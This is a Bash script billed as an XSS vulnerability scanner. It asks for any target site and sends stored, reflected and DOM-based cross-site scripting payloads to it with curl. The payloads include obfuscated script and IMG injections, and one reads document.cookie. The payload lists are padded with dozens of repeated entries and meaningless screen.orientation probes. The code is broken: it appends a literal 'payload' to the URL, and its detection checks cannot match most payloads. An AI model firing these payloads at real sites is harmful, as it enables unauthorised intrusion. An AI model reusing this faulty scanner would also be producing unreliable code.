#!/bin/bash
# This is a comment

# Function to perform Stored XSS vulnerability scan
scan_for_stored_xss() {
    echo "Scanning for Stored XSS vulnerabilities..."
    # Define Stored XSS payloads
    stored_payloads=("'><script>alert('Stored XSS')</script>"
                    "<script>alert('Stored XSS')</script>"
                    "<IMG SRC=`javascript:alert('Stored XSS')`>"
                    "<IMG SRC=javascript:alert('Stored XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('Stored XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG \"\"\"><SCRIPT>alert(\"Stored XSS\")</SCRIPT>\">"
                    "<IMG SRC=`javascript:alert('XSS')`>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=`javascript:alert('XSS')`>"
                    "<IMG SRC=`javascript:alert(String.fromCharCode(88,83,83))`>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=`javascript:alert('XSS')`>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                    "<IMG SRC=javascript:alert('XSS')>"
                    "<IMG SRC=JaVaScRiPt:alert('XSS')>")

    # Iterate over payloads and inject them into input fields
    for payload in "${stored_payloads[@]}"; do
        echo "Testing payload: $payload"
        response=$(curl -s -d "input_field=$payload" -X POST "$1" 2>/dev/null)
        # Check if the payload is executed in the response
        if [[ $response == *"alert('Stored XSS')"* ]]; then
            echo "Vulnerability detected! Payload: $payload"
            echo "To test this vulnerability, try submitting the payload '$payload' in an input field and observe if an alert box appears."
        fi
    done
}

# Function to perform Reflected XSS vulnerability scan
scan_for_reflected_xss() {
    echo "Scanning for Reflected XSS vulnerabilities..."
    # Define Reflected XSS payloads
    reflected_payloads=("'><script>alert('Reflected XSS')</script>"
                        "<script>alert('Reflected XSS')</script>"
                        "<IMG SRC=`javascript:alert('Reflected XSS')`>"
                        "<IMG SRC=javascript:alert('Reflected XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('Reflected XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG \"\"\"><SCRIPT>alert(\"Reflected XSS\")</SCRIPT>\">"
                        "<IMG SRC=`javascript:alert('XSS')`>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=`javascript:alert('XSS')`>"
                        "<IMG SRC=`javascript:alert(String.fromCharCode(88,83,83))`>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=`javascript:alert('XSS')`>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>"
                        "<IMG SRC=javascript:alert('XSS')>"
                        "<IMG SRC=JaVaScRiPt:alert('XSS')>")

    # Iterate over payloads and inject them into URL parameters
    for payload in "${reflected_payloads[@]}"; do
        echo "Testing payload: $payload"
        response=$(curl -s "$1$payload" 2>/dev/null)
        # Check if the payload is executed in the response
        if [[ $response == *"alert('Reflected XSS')"* ]]; then
            echo "Vulnerability detected! Payload: $payload"
            echo "To test this vulnerability, try appending the payload '$payload' to a URL parameter and observe if an alert box appears in the response."
        fi
    done
}

# Function to perform DOM-based XSS vulnerability scan
scan_for_dom_xss() {
    echo "Scanning for DOM-based XSS vulnerabilities..."
    # Define DOM-based XSS payloads
    dom_payloads=("javascript:alert('DOM-based XSS')"
                  "javascript:alert(document.cookie)"
                  "javascript:alert(document.domain)"
                  "javascript:alert(document.URL)"
                  "javascript:alert(document.title)"
                  "javascript:alert(document.referrer)"
                  "javascript:alert(document.location)"
                  "javascript:alert(window.name)"
                  "javascript:alert(window.frames.length)"
                  "javascript:alert(window.history.length)"
                  "javascript:alert(window.innerHeight)"
                  "javascript:alert(window.innerWidth)"
                  "javascript:alert(navigator.userAgent)"
                  "javascript:alert(navigator.appName)"
                  "javascript:alert(navigator.appVersion)"
                  "javascript:alert(navigator.userAgent)"
                  "javascript:alert(navigator.platform)"
                  "javascript:alert(navigator.language)"
                  "javascript:alert(navigator.cookieEnabled)"
                  "javascript:alert(navigator.javaEnabled)"
                  "javascript:alert(screen.width)"
                  "javascript:alert(screen.height)"
                  "javascript:alert(screen.pixelDepth)"
                  "javascript:alert(screen.colorDepth)"
                  "javascript:alert(screen.availWidth)"
                  "javascript:alert(screen.availHeight)"
                  "javascript:alert(screen.availLeft)"
                  "javascript:alert(screen.availTop)"
                  "javascript:alert(screen.orientation)"
                  "javascript:alert(screen.orientation.type)"
                  "javascript:alert(screen.orientation.angle)"
                  "javascript:alert(screen.orientation.lock)"
                  "javascript:alert(screen.orientation.unlock)"
                  "javascript:alert(screen.orientation.onchange)"
                  "javascript:alert(screen.orientation.lockOrientation)"
                  "javascript:alert(screen.orientation.unlockOrientation)"
                  "javascript:alert(screen.orientation.orientationLock)"
                  "javascript:alert(screen.orientation.locked)"
                  "javascript:alert(screen.orientationAngle)"
                  "javascript:alert(screen.orientationType)"
                  "javascript:alert(screen.orientationLock)"
                  "javascript:alert(screen.orientation.unlock)"
                  "javascript:alert(screen.orientation.onchange)"
                  "javascript:alert(screen.orientation.lockOrientation)"
                  "javascript:alert(screen.orientation.unlockOrientation)"
                  "javascript:alert(screen.orientation.orientationLock)"
                  "javascript:alert(screen.orientation.locked)"
                  "javascript:alert(screen.orientationAngle)"
                  "javascript:alert(screen.orientationType)"
                  "javascript:alert(screen.orientation.lockOrientation)"
                  "javascript:alert(screen.orientation.unlockOrientation)"
                  "javascript:alert(screen.orientation.orientationLock)"
                  "javascript:alert(screen.orientation.locked)"
                  "javascript:alert(screen.orientationAngle)"
                  "javascript:alert(screen.orientationType)"
                  "javascript:alert(screen.orientation.lockOrientation)"
                  "javascript:alert(screen.orientation.unlockOrientation)"
                  "javascript:alert(screen.orientation.orientationLock)"
                  "javascript:alert(screen.orientation.locked)"
                  "javascript:alert(screen.orientationAngle)"
                  "javascript:alert(screen.orientationType)"
                  "javascript:alert(screen.orientation.lockOrientation)"
                  "javascript:alert(screen.orientation.unlockOrientation)"
                  "javascript:alert(screen.orientation.orientationLock)"
                  "javascript:alert(screen.orientation.locked)"
                  "javascript:alert(screen.orientationAngle)"
                  "javascript:alert(screen.orientationType)")

    # Iterate over payloads and inject them into DOM elements
    for payload in "${dom_payloads[@]}"; do
        echo "Testing payload: $payload"
        response=$(curl -s -d "input_field=<img src='$payload'>" -X POST "$1" 2>/dev/null)
        # Check if the payload is executed in the response
        if [[ $response == *"alert('DOM-based XSS')"* ]]; then
            echo "Vulnerability detected! Payload: $payload"
            echo "To test this vulnerability, try injecting the payload '$payload' into a DOM element and observe if an alert box appears."
        fi
    done
}

# Main function
main() {
    echo "XSS Vulnerability Scanner"
    echo "-------------------------"

    # Prompt user for target website link
    read -p "Enter your target website link: " target_url

    # Append payloads to the provided link
    target_url_with_payload="${target_url}payload"

    # Perform XSS vulnerability scans
    scan_for_stored_xss "$target_url_with_payload"
    scan_for_reflected_xss "$target_url_with_payload"
    scan_for_dom_xss "$target_url_with_payload"
}

# Call main function
main
